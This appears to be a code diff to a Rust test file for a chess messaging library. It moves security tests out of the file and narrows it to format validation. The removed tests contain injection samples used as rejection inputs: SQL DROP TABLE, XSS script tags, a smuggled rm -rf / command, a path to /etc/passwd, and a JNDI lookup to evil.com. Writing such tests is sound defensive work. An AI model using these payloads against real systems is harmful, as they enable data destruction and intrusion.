@@ -1,19 +1,21 @@
-//! Comprehensive validation tests for chess message components
+//! Comprehensive validation tests for chess message components (Format & Structure Validation)
 //!
-//! This module tests all validation functions for chess message types including:
-//! - ValidationError type functionality
-//! - Game ID validation
-//! - Chess move format validation  
-//! - Board hash format validation
-//! - Message-specific validation
-//! - Integration validation and error propagation
+//! This module focuses on format validation and message structure validation including:
+//! - ValidationError type functionality and display traits
+//! - Game ID format validation (UUID structure, not security aspects)
+//! - Chess move format validation (algebraic notation, not injection prevention)
+//! - Board hash format validation (SHA-256 hex format, not tampering detection)
+//! - Message-specific validation (field validation, not security validation)
+//! - Integration validation and error propagation across components
+//!
+//! Note: Security-specific validation (injection prevention, rate limiting, cryptographic 
+//! validation, tampering detection) is handled in the security.rs test module.
 
 use mate::chess::{Board, Color};
 use mate::messages::chess::{
     generate_game_id, hash_board_state,
     security::{
-        validate_message_security, validate_secure_board_hash, validate_secure_chess_move,
-        validate_secure_fen_notation, validate_secure_game_id, validate_secure_move_history,
+        validate_secure_fen_notation, validate_secure_move_history,
         validate_secure_reason_text,
     },
     validate_chess_move_format, validate_game_accept, validate_game_decline, validate_game_id,
@@ -178,48 +180,7 @@ mod game_id_validation_tests {
     }
 
     #[test]
-    fn test_secure_game_id_validation() {
-        // Test the enhanced security validation
-        let valid_id = generate_game_id();
-        assert!(validate_secure_game_id(&valid_id).is_ok());
-
-        // Test nil UUID rejection in security validation
-        let nil_uuid = "00000000-0000-0000-0000-000000000000";
-        assert!(validate_secure_game_id(nil_uuid).is_err());
-
-        // Test non-v4 UUID rejection would require creating specific UUIDs
-        // For now, test invalid format rejection
-        assert!(validate_secure_game_id("invalid").is_err());
-        assert!(validate_secure_game_id("").is_err());
-    }
-
-    #[test]
-    fn test_game_id_malformed_input_handling() {
-        let malformed_inputs = vec![
-            "123",                                                                       // Too short
-            "123e4567-e89b-12d3-a456-426614174000-123e4567-e89b-12d3-a456-426614174000", // Too long
-            "12\x003e4567-e89b-12d3-a456-426614174000", // Control character
-            "😀23e4567-e89b-12d3-a456-426614174000",    // Unicode
-            "SELECT * FROM users",                      // SQL injection attempt
-            "<script>alert('xss')</script>",            // XSS attempt
-        ];
-
-        for input in malformed_inputs {
-            assert!(
-                !validate_game_id(input),
-                "Should reject malformed input: {}",
-                input
-            );
-            assert!(
-                validate_secure_game_id(input).is_err(),
-                "Security validation should reject: {}",
-                input
-            );
-        }
-    }
-
-    #[test]
-    fn test_generate_game_id_properties() {
+    fn test_basic_game_id_properties() {
         let id1 = generate_game_id();
         let id2 = generate_game_id();
 
@@ -229,10 +190,6 @@ mod game_id_validation_tests {
         // Generated IDs should be valid
         assert!(validate_game_id(&id1));
         assert!(validate_game_id(&id2));
-
-        // Generated IDs should pass security validation
-        assert!(validate_secure_game_id(&id1).is_ok());
-        assert!(validate_secure_game_id(&id2).is_ok());
 
         // Generated IDs should be correct length
         assert_eq!(id1.len(), 36);
@@ -347,50 +304,6 @@ mod chess_move_format_validation_tests {
         // Test control characters
         assert!(validate_chess_move_format("e2e4\0").is_err());
         assert!(validate_chess_move_format("e2e4\x01").is_err());
-    }
-
-    #[test]
-    fn test_secure_chess_move_validation() {
-        // Test security validation for chess moves
-        let valid_move = "e2e4";
-        assert!(validate_secure_chess_move(valid_move, "test-game").is_ok());
-
-        // Test long move rejection
-        let long_move = "e2e4".repeat(10);
-        assert!(validate_secure_chess_move(&long_move, "test-game").is_err());
-
-        // Test control character rejection
-        assert!(validate_secure_chess_move("e2e4\0", "test-game").is_err());
-
-        // Test empty move rejection
-        assert!(validate_secure_chess_move("", "test-game").is_err());
-
-        // Test excessive repetition
-        assert!(validate_secure_chess_move("aaaaa", "test-game").is_err());
-    }
-
-    #[test]
-    fn test_chess_move_injection_prevention() {
-        let injection_attempts = vec![
-            "'; DROP TABLE games; --",
-            "<script>alert('xss')</script>",
-            "e2e4\"; system('rm -rf /')",
-            "../../../etc/passwd",
-            "${jndi:ldap://evil.com/x}",
-        ];
-
-        for attempt in injection_attempts {
-            assert!(
-                validate_chess_move_format(attempt).is_err(),
-                "Should reject injection attempt: {}",
-                attempt
-            );
-            assert!(
-                validate_secure_chess_move(attempt, "test-game").is_err(),
-                "Security validation should reject: {}",
-                attempt
-            );
-        }
     }
 
     #[test]
@@ -586,76 +499,6 @@ mod board_hash_format_validation_tests {
                     // Other errors are acceptable
                 }
             }
-        }
-    }
-
-    #[test]
-    fn test_secure_board_hash_validation() {
-        let board = Board::new();
-        let correct_hash = hash_board_state(&board);
-        let wrong_hash = "0000000000000000000000000000000000000000000000000000000000000000";
-
-        // Test correct hash validation
-        assert!(validate_secure_board_hash("test-game", &board, &correct_hash, "test").is_ok());
-
-        // Test incorrect hash detection
-        assert!(validate_secure_board_hash("test-game", &board, wrong_hash, "test").is_err());
-
-        // Test invalid format rejection
-        assert!(validate_secure_board_hash("test-game", &board, "invalid", "test").is_err());
-        assert!(validate_secure_board_hash("test-game", &board, "", "test").is_err());
-    }
-
-    #[test]
-    fn test_hash_tampering_detection() {
-        let board = Board::new();
-        let correct_hash = hash_board_state(&board);
-
-        // Test slight modifications
-        let mut tampered_hash = correct_hash.clone();
-        tampered_hash.replace_range(0..1, "0");
-        assert!(validate_secure_board_hash("test-game", &board, &tampered_hash, "test").is_err());
-
-        // Test complete replacement
-        let fake_hash = "1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef";
-        assert!(validate_secure_board_hash("test-game", &board, fake_hash, "test").is_err());
-    }
-
-    #[test]
-    fn test_hash_consistency() {
-        let board = Board::new();
-
-        // Multiple calls should produce the same hash
-        let hash1 = hash_board_state(&board);
-        let hash2 = hash_board_state(&board);
-        assert_eq!(hash1, hash2);
-
-        // Hash should be deterministic
-        for _ in 0..10 {
-            let hash = hash_board_state(&board);
-            assert_eq!(hash, hash1);
-        }
-    }
-
-    #[test]
-    fn test_hash_injection_prevention() {
-        let injection_attempts = vec![
-            "'; DROP TABLE boards; --0000000000000000000000000000000000000000",
-            "<script>alert('xss')</script>00000000000000000000000000000000000",
-            "../../../etc/passwd\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
-            "${jndi:ldap://evil.com/x}\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
-        ];
-
-        for attempt in injection_attempts {
-            let move_msg = Move::new(generate_game_id(), "e2e4".to_string(), attempt.to_string());
-            assert!(
-                matches!(
-                    validate_move_message(&move_msg),
-                    Err(ValidationError::InvalidBoardHash(_))
-                ),
-                "Injection attempt should be rejected: {}",
-                attempt
-            );
         }
     }
 }
@@ -971,8 +814,8 @@ mod message_specific_validation_tests {
     }
 
     #[test]
-    fn test_security_validation_integration() {
-        // Test that security validation is properly integrated
+    fn test_basic_security_validation_integration() {
+        // Test that basic security validation is properly integrated
 
         // Test reason text security
         let safe_reason = "I'm busy with another game";
@@ -1132,44 +975,6 @@ mod integration_validation_tests {
             assert!(
                 message.validate().is_err(),
                 "Message should fail validation: {:?}",
-                message
-            );
-        }
-    }
-
-    #[test]
-    fn test_security_validation_integration() {
-        // Test that security validation is properly integrated with message validation
-        let game_id = generate_game_id();
-        let board = Board::new();
-
-        // Test security validation for all message types
-        let messages = vec![
-            Message::GameInvite(GameInvite::new(game_id.clone(), Some(Color::White))),
-            Message::GameAccept(GameAccept::new(game_id.clone(), Color::Black)),
-            Message::GameDecline(GameDecline::new(
-                game_id.clone(),
-                Some("Valid reason".to_string()),
-            )),
-            Message::Move(Move::new(
-                game_id.clone(),
-                "e2e4".to_string(),
-                hash_board_state(&board),
-            )),
-            Message::MoveAck(MoveAck::new(game_id.clone(), Some("move-1".to_string()))),
-            Message::SyncRequest(SyncRequest::new(game_id.clone())),
-            Message::SyncResponse(SyncResponse::new(
-                game_id.clone(),
-                board.to_fen(),
-                vec!["e2e4".to_string()],
-                hash_board_state(&board),
-            )),
-        ];
-
-        for message in messages {
-            assert!(
-                validate_message_security(&message).is_ok(),
-                "Security validation should pass for: {:?}",
                 message
             );
         }
